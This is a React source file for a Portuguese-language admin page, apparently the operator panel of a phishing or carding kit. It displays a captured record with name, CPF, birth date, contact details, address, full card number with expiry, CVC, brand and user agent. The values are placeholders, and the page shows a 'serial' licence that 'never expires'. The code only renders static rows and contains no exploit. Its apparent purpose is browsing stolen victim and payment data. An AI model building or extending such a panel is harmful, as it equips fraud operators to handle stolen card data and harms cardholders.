import { Settings } from 'lucide-react';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { AdminDrawer } from './components/AdminDrawer';
import { AdminHeader } from './components/AdminHeader';

const safeInfoRows = [
  'Nome: Maria Exemplo da Silva',
  'CPF: 000.000.000-00',
  'Data nascimento: 01/01/1990',
  'Email: maria.exemplo@email.com | Tel: (11) 90000-0000',
  'Rua: Rua Exemplo, 123',
  'Cidade: Americana',
  'Nome no cartão: Maria Exemplo da Silva',
  'CPF: 000.000.000-00',
  'Cartão: 4111 1111 1111 1111 [12|25] 000',
  'CVC: 123',
  'Bandeira: Visa',
  'Mozilla/5.0 (Linux; Android 10; K)',
  'AppleWebKit/537.36 (KHTML, like Gecko)',
  'Chrome/120.0.0.0 Mobile Safari/537.36',
];

function SideFloatingButton() {
  return (
    <div
      aria-hidden="true"
      className="fixed right-[-12px] top-[55%] z-40 flex h-9 w-9 -translate-y-1/2 items-center justify-center rounded-full bg-[#FF7A00]"
    >
      <div className="h-2 w-2 rounded-full bg-[#ff0048]" />
    </div>
  );
}

function SettingsButton() {
  return (
    <button
      aria-label="Configurações"
      className="fixed bottom-6 right-3 z-40 flex h-[42px] w-[42px] items-center justify-center rounded-[8px] bg-[#1A1F28] text-white shadow-lg hover:bg-[#202631]"
      type="button"
    >
      <Settings className="h-5 w-5" strokeWidth={2} />
    </button>
  );
}

function WelcomeSection() {
  return (
    <section className="px-5 pt-20">
      <h1 className="text-base font-medium leading-6 text-white sm:text-[18px] sm:leading-7">
        Olá abobora, você está em / ViewInfo
      </h1>
      <p className="mt-1 text-[13px] leading-5 text-[#7A7F89]">
        Seu serial vence NUNCA
      </p>
    </section>
  );
}

function InfoDetailCard() {
  return (
    <section className="mx-4 mt-5 rounded-[8px] border border-white/5 bg-[#1A1F28] p-5 sm:mx-5 sm:p-[20px]">
      <div className="border-b border-white/5 pb-4">
        <p className="break-words text-base font-medium leading-6 text-[#BFC5D0]">
          02-28073620231214174105504798
        </p>
      </div>

      <div className="divide-y divide-white/5">
        {safeInfoRows.map((row) => (
          <div className="py-4" key={row}>
            <p className="text-[13px] leading-5 text-[#BFC5D0]">{row}</p>
          </div>
        ))}
      </div>
    </section>
  );
}

function BackButton() {
  const navigate = useNavigate();

  return (
    <button
      className="mb-4 inline-flex items-center gap-1 text-[13px] font-medium leading-5 text-[#8B92A0] hover:text-white"
      onClick={() => navigate('/infos-consultaveis')}
      type="button"
    >
      ← Voltar
    </button>
  );
}

function ViewInfoPage() {
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);

  return (
    <div className="min-h-screen bg-[#12161E] pb-24 text-white">
      <AdminHeader onOpenDrawer={() => setIsDrawerOpen(true)} />
      <AdminDrawer
        activeRoute="/view-info"
        isOpen={isDrawerOpen}
        onClose={() => setIsDrawerOpen(false)}
      />
      <WelcomeSection />
      <div className="px-5 pt-3">
        <BackButton />
      </div>
      <InfoDetailCard />
      <SideFloatingButton />
      <SettingsButton />
    </div>
  );
}

export default ViewInfoPage;
